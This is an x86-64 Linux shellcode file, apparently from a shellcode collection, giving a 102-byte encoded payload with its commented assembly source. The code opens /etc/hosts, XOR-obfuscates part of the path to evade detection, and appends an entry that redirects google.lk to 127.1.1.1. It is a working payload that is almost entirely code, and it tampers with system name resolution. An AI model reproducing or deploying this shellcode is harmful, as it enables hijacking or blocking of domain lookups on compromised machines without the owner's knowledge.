; Author: Robert C. Raducioiu
; Shellcode length: 102 bytes
; Shellcode: "\x31\xc0\x50\x50\x5e\x66\xbe\x01\x04\x48\x83\xc0\x02\x66\x68\x74\x73\x48\xbb\xbe\x3b\x43\x5e\x4c\x4e\x94\x3b\x48\xb9\x91\x5e\x37\x3d\x63\x26\xfb\x48\x48\x31\xcb\x53\x48\x89\xe7\x0f\x05\x50\x5f\x31\xc0\x99\x80\xc2\x13\xff\xc0\xeb\x14\x48\x8b\x34\x24\x0f\x05\x31\xc0\xb0\x03\x0f\x05\x31\xc0\x04\xc3\xf6\xd0\x0f\x05\xe8\xe7\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x6c\x6b"

global _start

section .text

_start:

OpenFile:
   
    ; clear RAX for later usage
    xor eax, eax

    ; 2nd argument of open: flags to use when opening
    ; the file
    ; in this case: 0x401 (O_WRONLY | O_APPEND)
    push rax
    push rax
    pop rsi
    mov si, 0x401

    ; set RAX to 2 (syscall open)
    add rax, 2
    
    ; string "ts" of "/etc/hosts"
    push WORD 0x7374

    ; string "/etc/hos" encrypted through XOR
    mov rbx, 0x3b944e4c5e433bbe
    mov rcx, 0x48fb26633d375e91
    xor rbx, rcx
    push rbx

    ; 1st argument of open: pointer to the file to open
    ; file "/etc/hosts" in this case
    mov rdi, rsp

    ; invoke open syscall
    syscall

WriteFile:

    ; save the file descriptor of the opened file in
    ; the register RDI
    push rax
    pop rdi

    ; set RAX to 1 (syscall write)
    xor eax, eax

    ; clear RDX (for later use) by means of
    ; sign-extension of RAX
    cdq

    ; 3rd argument of write syscall, number of bytes
    ; to write 
    add dl, 19

    ; invoke the syscall write
    inc eax

    ; use the JMP-POP-CALL syscall to get the address
    ; of the new host entry into RSI
    jmp Data

RetrieveEntryPointer:

    mov rsi, QWORD [rsp]

    ; invoke syscall write
    syscall

CloseFile:

    ; invoke syscall close
    xor eax, eax
    mov al, 3
    syscall

Exit:

    ; invoke syscall exit
    xor eax, eax
    add al, 195
    not al
    syscall 

Data:

    call RetrieveEntryPointer
    text db '127.1.1.1 google.lk'
